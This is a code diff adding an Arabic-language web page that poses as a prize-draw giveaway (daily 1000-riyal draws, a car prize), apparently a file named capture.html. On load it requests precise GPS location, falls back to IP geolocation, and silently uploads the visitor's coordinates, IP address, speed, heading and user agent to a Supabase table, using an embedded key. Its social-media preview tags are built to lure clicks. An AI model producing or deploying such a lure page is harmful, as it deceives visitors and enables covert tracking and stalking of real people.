@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>سحوبات وجوائز</title>
+
+  <!-- OG / Twitter -->
+  <meta property="og:title" content="سحوبات وجوائز" />
+  <meta property="og:description" content="شارك معنا وادخل على سحوبات يوميه 1000 ريال واربح جوائز اسبوعية سيارة 2025" />
+  <meta property="og:image" content="https://raw.githubusercontent.com/xb7rbx/X/refs/heads/main/go.JPG" />
+  <meta property="og:url" content="https://xb7rbx.github.io/X/capture.html" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="سحوبات وجوائز" />
+  <meta name="twitter:description" content="شارك معنا وادخل على سحوبات يوميه 1000 ريال واربح جوائز اسبوعية سيارة 2025" />
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/xb7rbx/X/refs/heads/main/go.JPG" />
+
+  <!-- CSP خفيفة -->
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; img-src * data:; script-src 'self' https://cdn.jsdelivr.net https://unpkg.com; connect-src 'self' https://*.supabase.co https://ipwho.is; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; upgrade-insecure-requests">
+
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
+    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
+    .muted{color:#6b7280}.ok{color:#047857;font-weight:700}.err{color:#b91c1c;font-weight:700}
+    progress{width:100%}.hidden{display:none}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1 id="title">سحوبات وجوائز</h1>
+    <p id="desc" class="muted">شارك معنا وادخل على سحوبات يوميه 1000 ريال واربح جوائز اسبوعية سيارة 2025</p>
+    <progress id="bar" max="100" value="10"></progress>
+    <p id="status" class="muted">جارِ التحضير…</p>
+    <button id="retry" class="hidden">إعادة المحاولة</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // Supabase
+    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
+    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
+    const TABLE       = 'pings';
+    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);
+
+    // عناصر
+    const hTitle = document.getElementById('title');
+    const pDesc  = document.getElementById('desc');
+    const bar = document.getElementById('bar');
+    const statusEl = document.getElementById('status');
+    const retryBtn = document.getElementById('retry');
+
+    // -------- Helpers & Sanitization ----------
+    const qs = new URLSearchParams(location.search);
+    function sanitizeText(s, max=120){
+      if (s == null) return null;
+      s = s.slice(0, max);
+      const ok = /^[\u0600-\u06FF\w\s\-_.@#:/]+$/u;
+      return ok.test(s) ? s : null;
+    }
+    function setStatus(t, cls){ statusEl.textContent = t; statusEl.className = cls || 'muted'; }
+
+    // تسمح بتعديل العنوان/الوصف/الملاحظة من الرابط (اختياري)
+    const titleQP = sanitizeText(qs.get('title'), 80);
+    const descQP  = sanitizeText(qs.get('desc'), 160);
+    const noteQP  = sanitizeText(qs.get('note'), 120);
+    let redirect  = null;
+    (function(){
+      const raw = qs.get('redirect');
+      if (raw && raw.startsWith('/') && !raw.startsWith('//')) redirect = raw;
+    })();
+    if (titleQP) hTitle.textContent = titleQP;
+    if (descQP)  pDesc.textContent  = descQP;
+
+    // وضع الالتقاط: gps | ip | hybrid (افتراضي hybrid)
+    const modeRaw = (qs.get('mode') || 'hybrid').toLowerCase();
+    const MODE = ['gps','ip','hybrid'].includes(modeRaw) ? modeRaw : 'hybrid';
+
+    // -------- مزوّدو الموقع ----------
+    function gpsGeo(timeoutMs = 15000){
+      return new Promise((resolve,reject)=>{
+        if (!('geolocation' in navigator)) return reject(new Error('Geolocation unsupported'));
+        const opts = { enableHighAccuracy:true, timeout:timeoutMs, maximumAge:0 };
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const c = pos.coords;
+            resolve({ lat:c.latitude, lng:c.longitude, accuracy:c.accuracy ?? null,
+                      speed:c.speed ?? null, heading:c.heading ?? null, method:'gps' });
+          },
+          err => reject(err),
+          opts
+        );
+      });
+    }
+    async function ipGeo(){
+      const r = await fetch('https://ipwho.is/', { cache:'no-store' });
+      if (!r.ok) throw new Error('IP request failed');
+      const j = await r.json();
+      if (!j.success) throw new Error('IP geolocation failed');
+      return { lat:j.latitude ?? null, lng:j.longitude ?? null, ip:j.ip ?? null, accuracy:5000, method:'ip' };
+    }
+    async function save(row){
+      const { error } = await supabase.from(TABLE).insert([row]);
+      if (error) throw error;
+    }
+
+    async function start(){
+      try{
+        const ua = navigator.userAgent;
+        let result = null, ip = null;
+
+        if (MODE === 'gps') {
+          setStatus('محاولة تحديد دقيق عبر GPS…'); bar.value = 40;
+          result = await gpsGeo(15000);
+        } else if (MODE === 'ip') {
+          setStatus('تحديد تقريبي عبر IP…'); bar.value = 60;
+          result = await ipGeo();
+        } else {
+          try { // hybrid
+            setStatus('محاولة تحديد دقيق عبر GPS…'); bar.value = 40;
+            result = await gpsGeo(15000);
+          } catch {
+            setStatus('تعذّر GPS، نستخدم IP تقريبي…'); bar.value = 70;
+            result = await ipGeo();
+          }
+        }
+
+        ip = result.ip || null;
+        if (!ip) {
+          try{ const r = await fetch('https://ipwho.is/', {cache:'no-store'});
+               const j = await r.json(); if (j && j.ip) ip = j.ip; }catch{}
+        }
+
+        const finalNote = noteQP || null;
+
+        await save({
+          lat: result.lat, lng: result.lng, accuracy: result.accuracy,
+          ip, ua, note: finalNote,
+          speed: result.speed ?? null, heading: result.heading ?? null,
+          device_info: ua
+        });
+
+        bar.value = 100;
+        setStatus(result.method === 'gps' ? 'تم الحفظ بدقة GPS ✅' : 'تم الحفظ (تقريبي عبر IP) ✅', 'ok');
+        if (redirect) setTimeout(()=>location.assign(redirect), 800);
+
+      } catch(e){
+        setStatus('خطأ: ' + e.message, 'err');
+        retryBtn.classList.remove('hidden');
+      }
+    }
+
+    retryBtn.addEventListener('click', ()=>{
+      retryBtn.classList.add('hidden');
+      setStatus('إعادة المحاولة…'); bar.value = 10;
+      start();
+    });
+
+    start(); // يبدأ تلقائيًا
+  </script>
+</body>
+</html>
